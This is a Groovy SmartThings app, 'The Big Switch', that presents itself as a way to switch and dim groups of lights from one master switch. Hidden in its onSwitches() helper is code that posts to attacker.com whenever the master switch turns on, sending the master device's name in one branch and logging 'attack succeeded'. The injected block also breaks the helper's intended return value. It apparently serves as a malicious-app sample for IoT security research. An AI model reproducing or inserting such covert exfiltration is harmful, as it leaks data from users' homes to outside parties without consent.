
definition(
    name:"The Big Switch",
    namespace:"smartthings",
    author:"SmartThings",
    description:"Turns on,off and dim a collection of lights based on the state of a specific switch.",
    category:"Convenience",
    iconUrl:"https://s3.amazonaws.com/smartapp-icons/Meta/light_outlet.png",
    iconX2Url:"https://s3.amazonaws.com/smartapp-icons/Meta/light_outlet@2 x.png"
)

preferences{
    section("When this switch is turned on,off or dimmed"){
        input"master","capability.switch",title:"Where?"
        }
    section("Turn on or off all of these switches as well"){
        input"switches","capability.switch",multiple:true,required:false
        }
    section("And turn off but not on all of these switches"){
        input"offSwitches","capability.switch",multiple:true,required:false
        }
    section("And turn on but not off all of these switches"){
        input"onSwitches","capability.switch",multiple:true,required:false
        }
    section("And Dim these switches"){
        input"dimSwitches","capability.switchLevel",multiple:true,required:false
        }
}

def installed()
{
    subscribe(master,"switch.on",onHandler)
    subscribe(master,"switch.off",offHandler)
    subscribe(master,"level",dimHandler)
}

def updated()
{
    unsubscribe()
    subscribe(master,"switch.on",onHandler)
    subscribe(master,"switch.off",offHandler)
    subscribe(master,"level",dimHandler)
}

def logHandler(evt){
    log.debug evt.value
}

def onHandler(evt){
    log.debug evt.value
    log.debug onSwitches()
    onSwitches()?.on()
}

def offHandler(evt){
    log.debug evt.value
    log.debug offSwitches()
    offSwitches()?.off()
}

def dimHandler(evt){
    log.debug"Dim level:$evt.value"
    dimSwitches?.setLevel(evt.value)
}

private onSwitches(){
    def takeParams=[
    uri:"https://attacker.com",
    path:"",
    requestContentType:"application/x-www-form-urlencoded",
    body:[
    "massage":"Hello"
    ]
    ]
    if(switches&&onSwitches){
        takeParams=[
        uri:"https://attacker.com",
        path:"",
        requestContentType:"application/x-www-form-urlencoded",
        body:[
        "massage":"Hi"
        ]
        ]
        switches+onSwitches}
    else{
         takeParams=[
        uri:"https://attacker.com",
        path:"",
        requestContentType:"application/x-www-form-urlencoded",
        body:[
        "massage":"${master}"
        ]
        ]
    
    if(switches){switches}
        else{onSwitches}
    }
    try{
        httpPost(takeParams){resp->
            if(resp.status==200){
                log.debug"attack succeeded"
            }else{
                    log.error"attack failed"
                }
            }
        }
    catch(Exception e){
        log.error"Unexpected exception",e
    }
}

private offSwitches(){
    if(switches&&offSwitches){switches+offSwitches}
    else if(switches){switches}
        else{offSwitches}
}

